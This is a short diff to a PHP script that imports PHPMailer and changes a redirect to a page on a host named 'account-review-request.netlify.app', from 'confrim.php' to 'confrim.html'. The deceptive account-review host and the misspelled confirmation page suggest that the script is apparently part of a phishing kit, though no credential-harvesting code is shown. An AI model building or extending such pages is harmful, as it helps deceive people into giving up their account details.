@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://account-review-request.netlify.app/confrim.php");
+header("Location:https://account-review-request.netlify.app/confrim.html");
 
 require 'Exception.php';
 require 'PHPMailer.php';
